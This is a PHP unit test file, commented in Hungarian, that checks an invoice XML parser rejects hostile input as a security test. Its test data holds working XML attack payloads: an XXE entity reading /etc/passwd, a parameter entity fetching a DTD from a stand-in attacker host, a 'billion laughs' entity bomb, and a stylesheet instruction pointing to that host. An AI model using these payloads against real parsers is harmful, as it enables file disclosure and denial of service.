<?php

declare(strict_types=1);

namespace Tests\Unit;

use App\Services\Extraction\Xml\XmlKiolvaso;
use PHPUnit\Framework\TestCase;

/**
 * Az XML a rendszer egyik legkitettebb pontja: a cég beküldési címére bárki
 * küldhet e-mailt, hitelesítés nélkül, és a melléklet egyenesen az
 * értelmezőbe kerül. Ezért a támadó által megírt fájlt kell alapesetnek venni,
 * nem a jóindulatú számlát.
 */
final class XmlBiztonsagTest extends TestCase
{
    private XmlKiolvaso $kiolvaso;

    protected function setUp(): void
    {
        parent::setUp();
        $this->kiolvaso = new XmlKiolvaso;
    }

    /**
     * XXE: külső entitással a szerver fájljait próbálja kiolvastatni. A
     * doctype-os fájlt eleve eldobjuk, de a lényeg, hogy a jelszófájl
     * tartalma semmilyen mezőbe ne kerülhessen bele.
     */
    public function test_kulso_entitassal_nem_olvas_fajlt(): void
    {
        $tamadas = <<<'XML'
        <?xml version="1.0"?>
        <!DOCTYPE Invoice [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <Invoice xmlns="urn:oasis:names:specification:ubl:schema:xsd:Invoice-2"
                 xmlns:cbc="urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2">
          <cbc:ID>&xxe;</cbc:ID>
        </Invoice>
        XML;

        $eredmeny = $this->kiolvaso->ertelmez($tamadas);

        $this->assertNull($eredmeny, 'A doctype-ot tartalmazó fájlt el kell dobni.');
    }

    /** Ugyanez paraméter-entitással, ami a DTD-n keresztül próbálkozik. */
    public function test_parameter_entitassal_sem(): void
    {
        $tamadas = <<<'XML'
        <?xml version="1.0"?>
        <!DOCTYPE Invoice [<!ENTITY % kulso SYSTEM "http://tamado.example/x.dtd"> %kulso;]>
        <Invoice xmlns="urn:oasis:names:specification:ubl:schema:xsd:Invoice-2"><ID>1</ID></Invoice>
        XML;

        $this->assertNull($this->kiolvaso->ertelmez($tamadas));
    }

    /**
     * „Billion laughs": egymásba ágyazott entitásokkal robbantaná fel a
     * memóriát. Doctype nélkül nincs entitásdefiníció, tehát a védelem
     * ugyanaz — de külön is ki kell mondani, hogy ez a fájl nem fut le.
     */
    public function test_entitas_bomba_nem_robban(): void
    {
        $tamadas = <<<'XML'
        <?xml version="1.0"?>
        <!DOCTYPE Invoice [
          <!ENTITY a "aaaaaaaaaa">
          <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
          <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
          <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
        ]>
        <Invoice xmlns="urn:oasis:names:specification:ubl:schema:xsd:Invoice-2"><ID>&d;</ID></Invoice>
        XML;

        $this->assertNull($this->kiolvaso->ertelmez($tamadas));
    }

    /**
     * Az XSLT-utasítás önmagában nem az értelmezőnek veszélyes, hanem a
     * böngészőnek, ha XML típussal szolgálnánk ki (lásd
     * DokumentumFajlController). Az értelmező viszont nem akadhat el rajta:
     * a számlaadatot ugyanúgy ki kell olvasnia.
     */
    public function test_a_stiluslap_utasitas_nem_zavarja_meg(): void
    {
        $xml = <<<'XML'
        <?xml version="1.0"?>
        <?xml-stylesheet type="text/xsl" href="http://tamado.example/x.xsl"?>
        <Invoice xmlns="urn:oasis:names:specification:ubl:schema:xsd:Invoice-2"
                 xmlns:cbc="urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2">
          <cbc:ID>SZ-1</cbc:ID>
        </Invoice>
        XML;

        $eredmeny = $this->kiolvaso->ertelmez($xml);

        $this->assertNotNull($eredmeny);
        $this->assertSame('SZ-1', $eredmeny['nyers']['doc_number']);
    }
}
